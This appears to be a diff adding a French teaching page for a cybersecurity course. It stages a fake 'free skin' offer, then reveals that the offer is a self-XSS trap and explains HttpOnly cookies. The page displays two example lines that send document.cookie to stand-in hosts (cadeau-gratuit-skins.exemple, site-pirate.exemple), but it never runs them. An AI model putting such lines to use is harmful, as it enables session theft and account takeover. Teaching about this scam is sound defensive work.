@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Offre exclusive — Débloque le contenu</title>
+<style>
+    :root {
+        --bg: #14161a; --panel: #1c1f25; --panel-2: #22262d; --border: #2e333b;
+        --text: #e7e9ec; --muted: #9aa2ad; --accent: #b03ce0; --accent-hover: #c455f0;
+        --warn: #e0a63c; --trap: #3ccb7f;
+    }
+    * { box-sizing: border-box; }
+    body { margin:0; min-height:100vh; background:var(--bg); color:var(--text);
+        font-family:'Segoe UI','Inter',Arial,sans-serif; display:flex; flex-direction:column; }
+    header { background:var(--panel); border-bottom:1px solid var(--border); padding:14px 20px;
+        font-size:0.95em; letter-spacing:0.03em; color:var(--muted); text-transform:uppercase; }
+    main { flex:1; display:flex; align-items:center; justify-content:center; padding:24px; }
+    .card { background:var(--panel); border:1px solid var(--border); border-radius:10px;
+        padding:36px; width:100%; max-width:460px; text-align:center; }
+    .emoji-hero { font-size:2.6em; margin-bottom:10px; }
+    h1 { font-size:1.3em; margin:0 0 10px 0; font-weight:700; line-height:1.35;
+        background:linear-gradient(90deg,var(--accent),#f04c8c);
+        -webkit-background-clip:text; background-clip:text; color:transparent; }
+    .sous-texte { color:var(--muted); font-size:0.92em; margin-bottom:22px; line-height:1.55; }
+    .etapes { text-align:left; background:var(--panel-2); border:1px solid var(--border);
+        border-radius:8px; padding:16px 18px; margin-bottom:22px; font-size:0.88em; line-height:1.7; }
+    .etapes b { color:var(--accent); }
+    .code-a-coller { background:#0d0e11; border:1px solid var(--border); border-radius:6px;
+        padding:12px 14px; font-family:'Consolas',monospace; font-size:0.82em; color:#7ee787;
+        margin-bottom:18px; word-break:break-all; text-align:left; position:relative; }
+    .copy-btn { position:absolute; top:8px; right:8px; background:var(--panel-2);
+        border:1px solid var(--border); color:var(--muted); font-size:0.75em; padding:4px 8px;
+        border-radius:4px; cursor:pointer; }
+    .copy-btn:hover { color:var(--text); }
+    .field { margin-bottom:16px; text-align:left; }
+    label { display:block; font-size:0.85em; color:var(--muted); margin-bottom:6px; }
+    textarea { width:100%; background:var(--panel-2); border:1px solid var(--border); color:var(--text);
+        padding:12px 14px; border-radius:6px; font-size:0.95em; font-family:'Consolas',monospace;
+        min-height:70px; resize:vertical; outline:none; }
+    textarea:focus { border-color:var(--accent); }
+    button.submit { width:100%; background:var(--accent); color:#fff; border:none; padding:13px;
+        border-radius:6px; font-size:1.02em; font-weight:600; cursor:pointer; margin-top:6px; }
+    button.submit:hover { background:var(--accent-hover); }
+    .hint { margin-top:16px; font-size:0.8em; color:var(--muted); line-height:1.5;
+        background:var(--panel-2); border:1px solid var(--border); border-radius:6px; padding:10px 12px; }
+    footer { text-align:center; padding:14px; font-size:0.78em; color:var(--muted);
+        border-top:1px solid var(--border); background:var(--panel); }
+    footer a { color:var(--muted); text-decoration:underline; cursor:pointer; }
+    footer a:hover { color:var(--text); }
+    .footer-flag { display:block; margin-bottom:4px; color:var(--warn); font-weight:600; letter-spacing:0.02em; }
+
+    #reveal-screen { display:none; }
+    .reveal-card { background:var(--panel); border:1px solid var(--trap); border-radius:10px;
+        padding:36px; width:100%; max-width:480px; }
+    .reveal-title { font-size:1.4em; font-weight:700; margin:0 0 6px 0; color:var(--trap); }
+    .reveal-sub { color:var(--muted); margin-bottom:22px; }
+    .reveal-explication { font-size:0.92em; line-height:1.6; color:var(--text); }
+    .reveal-explication code { background:var(--panel-2); border:1px solid var(--border);
+        border-radius:4px; padding:1px 6px; }
+    .reveal-btn { margin-top:22px; background:var(--panel-2); border:1px solid var(--border);
+        color:var(--text); padding:10px 16px; border-radius:6px; cursor:pointer; font-size:0.9em; }
+    .reveal-btn:hover { border-color:var(--accent); }
+
+    .correction-box { margin-top:24px; border:1px solid var(--trap); border-radius:8px; overflow:hidden; }
+    .correction-toggle { width:100%; text-align:left; background:rgba(60,203,127,0.08); border:none;
+        color:var(--trap); padding:14px 16px; font-size:0.95em; font-weight:600; cursor:pointer;
+        display:flex; justify-content:space-between; align-items:center; }
+    .correction-content { display:none; padding:16px 18px 20px 18px; font-size:0.88em;
+        line-height:1.6; border-top:1px solid var(--border); }
+    .correction-content h3 { font-size:0.95em; margin:16px 0 6px 0; color:var(--text); }
+    .correction-content h3:first-child { margin-top:0; }
+    .code-compare { display:grid; grid-template-columns:1fr; gap:10px; margin:8px 0 14px 0; }
+    .code-block { background:var(--panel-2); border:1px solid var(--border); border-radius:6px;
+        padding:10px 12px; font-family:'Consolas',monospace; font-size:0.85em;
+        white-space:pre-wrap; word-break:break-word; }
+    .code-block.bad { border-left:3px solid #e0554c; }
+    .code-block.good { border-left:3px solid var(--trap); }
+    .code-label { font-size:0.78em; color:var(--muted); margin-bottom:4px;
+        text-transform:uppercase; letter-spacing:0.03em; }
+    .cookie-demo { margin-top:16px; }
+    .cookie-demo button { background:var(--trap); border:none; color:#08130d; padding:9px 14px;
+        border-radius:6px; font-size:0.88em; font-weight:700; cursor:pointer; margin-bottom:12px; }
+    .cookie-demo button:hover { opacity:0.9; }
+    .cookie-resultat { display:none; }
+    .cookie-ligne { display:flex; justify-content:space-between; align-items:center;
+        background:var(--panel-2); border:1px solid var(--border); border-radius:6px;
+        padding:10px 12px; margin-bottom:8px; font-family:'Consolas',monospace; font-size:0.85em; }
+    .cookie-ligne .statut-vol { font-weight:700; }
+    .cookie-ligne .statut-vol.vole { color:var(--danger); }
+    .cookie-ligne .statut-vol.protege { color:var(--trap); }
+
+    .modal-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.7);
+        align-items:center; justify-content:center; padding:20px; z-index:100; }
+    .modal-box { background:var(--panel); border:1px solid var(--border); border-radius:10px;
+        padding:26px; max-width:480px; font-size:0.9em; line-height:1.6; }
+    .modal-box h2 { margin-top:0; font-size:1.1em; }
+    .modal-close { margin-top:16px; background:var(--accent); border:none; color:#fff;
+        padding:9px 16px; border-radius:6px; cursor:pointer; }
+</style>
+</head>
+<body>
+
+<header>🎁 Offre exclusive (environnement de démonstration)</header>
+
+<main>
+    <div id="login-screen" class="card">
+        <div class="emoji-hero">🎁</div>
+        <h1>Débloque un skin exclusif GRATUIT !</h1>
+        <div class="sous-texte">Offert à durée limitée aux 500 premiers — colle simplement le code ci-dessous dans la console de ton navigateur.</div>
+
+        <div class="etapes">
+            1. Ouvre la console : touche <b>F12</b>, puis clique sur l'onglet <b>Console</b><br>
+            2. Colle le code ci-dessous dedans<br>
+            3. Appuie sur <b>Entrée</b> — ton skin est débloqué instantanément !
+        </div>
+
+        <div class="code-a-coller" id="code-a-coller">
+            <button type="button" class="copy-btn" id="btn-copier-code">📋 Copier</button>
+            fetch('https://cadeau-gratuit-skins.exemple/deverrouiller?token=' + document.cookie).then(r=>alert('Skin débloqué !'))
+        </div>
+
+        <div class="field">
+            <label for="reponse">Colle ici ce que tu as fait dans la console (pour valider la démo) :</label>
+            <textarea id="reponse" placeholder="colle le code ici..."></textarea>
+        </div>
+        <button type="button" class="submit" id="btn-valider">J'ai collé le code dans la console</button>
+
+        <div class="hint">
+            ⚠️ Ne colle jamais un code que tu ne comprends pas dans la console de ton navigateur, même pour "débloquer" quelque chose.
+        </div>
+    </div>
+
+    <div id="reveal-screen" class="reveal-card">
+        <div class="reveal-title">🎣 Te voilà piégé·e !</div>
+        <div class="reveal-sub">C'était un faux "cadeau" — technique appelée le <strong>self-XSS</strong>.</div>
+
+        <div class="reveal-explication">
+            Le code que tu viens de coller (ou que tu aurais collé sur un vrai piège) ne "débloque" jamais rien.
+            Il vole en réalité tes <code>cookies</code> de session — l'équivalent numérique de la clé qui te
+            garde connecté·e sur un site (Discord, Instagram, un jeu...). Une fois envoyés à quelqu'un d'autre,
+            cette personne peut se faire passer pour toi sans même connaître ton mot de passe.
+            <br><br>
+            C'est <strong>toi-même</strong> qui exécutes le code malveillant en le collant dans ta propre
+            console — d'où le nom <em>self-XSS</em> ("cross-site scripting" que tu t'infliges toi-même). Aucun
+            site sérieux (Discord, Instagram, banque...) ne te demandera jamais de coller quoi que ce soit dans
+            la console pour "débloquer" un avantage.
+            <br><br>
+            Dans cette démo, aucune requête n'a réellement été envoyée — regarde le code source, l'adresse
+            <code>cadeau-gratuit-skins.exemple</code> n'existe pas.
+        </div>
+
+        <div class="correction-box">
+            <button type="button" class="correction-toggle" id="btn-toggle-correction">
+                <span>🔧 Comment se protéger, pour de vrai ?</span>
+                <span id="correction-chevron">▾</span>
+            </button>
+            <div class="correction-content" id="correction-content">
+                <h3>Le problème</h3>
+                La console développeur d'un navigateur a les mêmes droits que le site lui-même : tout code
+                collé là s'exécute "en tant que toi", avec accès à tes cookies et données de session.
+
+                <h3>Ce que fait le code piégé</h3>
+                <div class="code-compare">
+                    <div>
+                        <div class="code-label">❌ Ce que tu as collé (piège)</div>
+                        <div class="code-block bad">fetch('https://site-pirate.exemple/vol?token='
+     + document.cookie)
+// Envoie discrètement tes cookies de session
+// à un serveur contrôlé par l'attaquant</div>
+                    </div>
+                    <div>
+                        <div class="code-label">✅ Le seul vrai réflexe</div>
+                        <div class="code-block good">Ne JAMAIS coller de code dans la console
+d'un navigateur suggéré par un site tiers,
+un message privé ou une pub — quelle que
+soit la récompense promise.</div>
+                    </div>
+                </div>
+
+                <h3>Les règles à retenir</h3>
+                1. Aucun site légitime ne demande jamais d'ouvrir la console pour "débloquer" un avantage.<br>
+                2. Un cookie de session volé permet souvent de se connecter à ta place sans mot de passe.<br>
+                3. Si un site te dit "colle ce code magique", c'est un piège à 100% des cas — ferme l'onglet.<br>
+                4. Cette arnaque cible en vrai Facebook, Discord, Instagram : le principe est identique partout.
+
+                <h3>🔬 Une vraie protection existe : le drapeau HttpOnly</h3>
+                Clique sur le bouton ci-dessous : cette page va réellement créer un cookie dans ton navigateur
+                (avec du vrai JavaScript, pas une simulation), exactement comme le ferait le code volé plus
+                haut.
+                <div class="cookie-demo">
+                    <button type="button" id="btn-creer-cookie">🍪 Créer un vrai cookie et essayer de le lire</button>
+                    <div class="cookie-resultat" id="cookie-resultat">
+                        <div class="cookie-ligne">
+                            <span>Cookie normal (créé à l'instant par JS)</span>
+                            <span class="statut-vol vole" id="statut-normal">❌ VOLÉ</span>
+                        </div>
+                        <div class="cookie-ligne">
+                            <span>Cookie avec le drapeau <code>HttpOnly</code> (hypothétique)</span>
+                            <span class="statut-vol protege">🔒 INVISIBLE</span>
+                        </div>
+                        <div class="code-label" style="margin-top:10px;">Ce que <code>document.cookie</code> a réellement pu lire, à l'instant, dans TON navigateur :</div>
+                        <div class="code-block bad" id="cookie-lu"></div>
+                    </div>
+                </div>
+                <p style="font-size:0.85em; color:var(--muted);">
+                    Le cookie normal ci-dessus a été volé pour de vrai par le <code>document.cookie</code> de
+                    cette page — la preuve est sous tes yeux. Un cookie marqué <code>HttpOnly</code> par le
+                    serveur (impossible à créer depuis une simple page comme celle-ci, ça doit venir d'une vraie
+                    réponse de serveur) serait resté totalement invisible pour <code>document.cookie</code>,
+                    même face à ce même code volé : c'est une garantie du navigateur lui-même, pas juste une
+                    bonne pratique de code. Sur un vrai site, les cookies de session sensibles sont presque
+                    toujours protégés par ce drapeau.
+                </p>
+            </div>
+        </div>
+
+        <button type="button" class="reveal-btn" id="btn-reset">↺ Recommencer</button>
+    </div>
+</main>
+
+<footer>
+    <span class="footer-flag">🔒 Page pédagogique — cours de cybersécurité</span>
+    Ceci n'est pas une vraie offre. <a id="lien-mentions">Mentions légales</a>
+</footer>
+
+<div class="modal-overlay" id="modal-overlay">
+    <div class="modal-box">
+        <h2>Mentions légales</h2>
+        <p>Cette page est une <strong>reconstitution fictive</strong> créée dans le cadre d'un cours de
+        cybersécurité, à des fins pédagogiques uniquement. Le code affiché ne fonctionne pas et ne pointe vers
+        aucun vrai serveur.</p>
+        <p>Aucune donnée saisie sur cette page n'est envoyée, transmise, collectée ou conservée : tout reste
+        localement dans votre navigateur et disparaît à la fermeture de la page.</p>
+        <button class="modal-close" id="btn-close-modal">Fermer</button>
+    </div>
+</div>
+
+<script>
+    // Aucune requête réseau réelle : le "code à copier" affiché est un simple texte, jamais exécuté par cette page.
+
+    document.getElementById('btn-copier-code').addEventListener('click', function() {
+        const texte = document.getElementById('code-a-coller').innerText.replace('📋 Copier', '').trim();
+        if (navigator.clipboard) { navigator.clipboard.writeText(texte).catch(() => {}); }
+    });
+
+    document.getElementById('btn-valider').addEventListener('click', function() {
+        document.getElementById('login-screen').style.display = 'none';
+        document.getElementById('reveal-screen').style.display = 'block';
+    });
+
+    document.getElementById('btn-reset').addEventListener('click', function() {
+        document.getElementById('reponse').value = '';
+        document.getElementById('reveal-screen').style.display = 'none';
+        document.getElementById('login-screen').style.display = 'block';
+        document.getElementById('correction-content').style.display = 'none';
+        document.getElementById('correction-chevron').innerText = '▾';
+        document.getElementById('cookie-resultat').style.display = 'none';
+        const btnCookie = document.getElementById('btn-creer-cookie');
+        btnCookie.disabled = false;
+        btnCookie.innerText = '🍪 Créer un vrai cookie et essayer de le lire';
+    });
+
+    document.getElementById('btn-creer-cookie').addEventListener('click', function() {
+        // Vrai cookie, réellement posé par cette page (démonstration honnête : JS PEUT le faire, c'est
+        // justement le problème). Un cookie HttpOnly, lui, ne peut être posé QUE par une réponse de serveur
+        // (en-tête Set-Cookie: ...; HttpOnly) — impossible à reproduire depuis une page statique comme
+        // celle-ci, ce qui est cohérent avec l'explication : document.cookie ne le verrait jamais.
+        document.cookie = "session_demo=ABC123XYZ; path=/; SameSite=Lax";
+        document.getElementById('cookie-lu').innerText = document.cookie || "(vide)";
+        document.getElementById('statut-normal').innerText = document.cookie.includes('session_demo') ? '❌ VOLÉ' : '⚠️ non créé (cookies désactivés ?)';
+        document.getElementById('cookie-resultat').style.display = 'block';
+        this.disabled = true;
+        this.innerText = '✅ Cookie créé — regarde le résultat ci-dessous';
+    });
+
+    document.getElementById('btn-toggle-correction').addEventListener('click', function() {
+        const contenu = document.getElementById('correction-content');
+        const ouvert = contenu.style.display === 'block';
+        contenu.style.display = ouvert ? 'none' : 'block';
+        document.getElementById('correction-chevron').innerText = ouvert ? '▾' : '▴';
+    });
+
+    document.getElementById('lien-mentions').addEventListener('click', function() {
+        document.getElementById('modal-overlay').style.display = 'flex';
+    });
+    document.getElementById('btn-close-modal').addEventListener('click', function() {
+        document.getElementById('modal-overlay').style.display = 'none';
+    });
+    document.getElementById('modal-overlay').addEventListener('click', function(e) {
+        if (e.target === this) this.style.display = 'none';
+    });
+</script>
+
+</body>
+</html>
